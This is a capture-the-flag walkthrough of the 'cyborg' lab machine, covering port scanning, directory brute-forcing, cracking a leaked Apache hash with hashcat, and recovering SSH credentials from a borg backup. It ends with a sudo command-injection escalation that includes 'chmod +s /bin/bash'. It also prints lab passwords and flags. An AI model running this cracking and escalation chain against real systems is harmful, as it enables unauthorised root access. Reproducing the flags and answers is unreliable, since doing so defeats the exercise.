# cyborg

```
export IP=10.10.106.14
```

## Nmap scan
nmap -v -sC -sV -oN scans/initial $IP
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Task 2


### Scan the machine, how many ports are open?

Answer:2


### What service is running on port 22?

Answer:ssh


### What service is running on port 80?

Answer:http

### What is the user.txt flag?

gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 100 -q -o scans/gobuster-small.txt

```
/admin                (Status: 301) [Size: 312] [--> http://10.10.106.14/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.106.14/etc/]  
```

/etc/ --> username:squid pwd:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

hash-identifier $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. 

```
Possible Hashs:
[+] MD5(APR)
```

hashcat -v -m 1600 ./md5.hash /opt/rockyou.txt 

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward

download archive.tar from /admin/

tar -xvf archive.tar 

borg extract ./home/field/dev/final_archive::music_archive

GOTO home/alex/Documents

alex:S3cretP@s3

ssh alex@10.10.106.14

cat user.txt

```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

### What is the root.txt flag?

sudo -l -> sudo permissions shows us the privilege to run a shell script as root

As this looks like a simple script to compress a bunch of mp3 files in an archive we notice two parts

```	
while getopts c: flag
do
    case "${flag}" in
        c) command=${OPTARG};;
    esac
done
 
...
 
cmd=$($command)
echo $cmd

```
We can add an argument (-c) to the script. The output of the command will be passed to the $cmd variable it it's getting echo'ed. So lets get that root flag with

sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"

```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
To compromise the system run:

sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"

Answer:


